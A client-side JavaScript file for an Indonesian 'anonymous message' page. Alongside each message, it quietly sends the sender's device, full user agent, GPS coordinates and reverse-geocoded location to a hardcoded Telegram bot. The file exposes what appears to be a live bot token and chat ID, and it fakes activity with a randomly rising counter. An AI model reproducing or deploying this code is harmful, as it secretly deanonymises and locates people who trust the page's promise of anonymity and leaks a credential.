const botToken = "7970729647:AAG66mxCHoWOiZIs5ljGZIGoy4jMSX0PvMQ";
const chatId = "6377246807";
let isSending = false;

async function sendMessage() {
    if (isSending) return;
    isSending = true;

    const message = document.getElementById("inputMessage").value;
    if (!message.trim()) {
        Swal.fire("Error", "Pesan tidak boleh kosong!", "error");
        isSending = false;
        return;
    }

    let fullMessage = `📩 Anonim Pesan: ${message}\n\n📱 Perangkat: ${getDeviceInfo()}`;
    let locationText = await getLocation();
    if (locationText) fullMessage += `\n\n${locationText}`;

    let success = await sendText(fullMessage);
    if (success) {
        await Swal.fire("Terkirim!", "Pesan telah dikirim.", "success");
        window.location.href = "/kirim/index.html"; // Redirect setelah alert muncul
    } else {
        Swal.fire("Gagal", "Pesan gagal dikirim.", "error");
    }

    document.getElementById("inputMessage").value = "";
    isSending = false;
}

async function sendText(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text })
        });

        return response.ok; // Mengembalikan true jika sukses, false jika gagal
    } catch (error) {
        console.error("Gagal mengirim pesan:", error);
        return false;
    }
}

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let device = "Tidak Diketahui";

    if (/android/i.test(userAgent)) {
        device = "Android";
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        device = "iOS";
    } else if (/Windows/i.test(userAgent)) {
        device = "Windows";
    } else if (/Mac/i.test(userAgent)) {
        device = "MacOS";
    } else if (/Linux/i.test(userAgent)) {
        device = "Linux";
    }

    return `${device} (${userAgent})`;
}

function getLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async position => {
                const { latitude, longitude } = position.coords;
                const locationText = await getAddressFromCoords(latitude, longitude);
                resolve(`${locationText}\n\n📍 Koordinat: ${latitude}, ${longitude}`);
            }, () => {
                console.warn("Akses lokasi ditolak.");
                resolve(null);
            });
        } else {
            resolve(null);
        }
    });
}

async function getAddressFromCoords(latitude, longitude) {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await response.json();
        if (data.address) {
            const { country, state, city, town, village } = data.address;
            const locationParts = [city || town || village, state, country].filter(Boolean);
            return `📍 Lokasi: ${locationParts.join(", ")}`;
        }
        return "📍 Lokasi tidak ditemukan";
    } catch (error) {
        console.error("Gagal mendapatkan lokasi:", error);
        return "📍 Lokasi tidak tersedia";
    }
}

let count = 50; // Mulai dari 50

function updateCount() {
    let randomIncrease = Math.floor(Math.random() * 10) + 1; // Tambah angka acak antara 1-10
    count += randomIncrease;
    document.getElementById("number").textContent = count;
}

// Jalankan peningkatan angka terus-menerus setiap 2 detik
setInterval(updateCount, 2000);

async function getRandomText() {
    try {
        let response = await fetch('text.json'); // Ambil data dari text.json
        let texts = await response.json(); // Ubah ke JSON
        let randomIndex = Math.floor(Math.random() * texts.length); // Pilih index acak
        document.getElementById("inputMessage").value = texts[randomIndex]; // Masukkan ke input
    } catch (error) {
        console.error("Error fetching random text:", error);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    let inputMessage = document.getElementById("inputMessage");
    let sendButton = document.getElementById("sendButton");

    function toggleSendButton() {
        sendButton.style.display = inputMessage.value.trim() !== "" ? "block" : "none";
    }

    toggleSendButton();
    inputMessage.addEventListener("input", toggleSendButton);
});
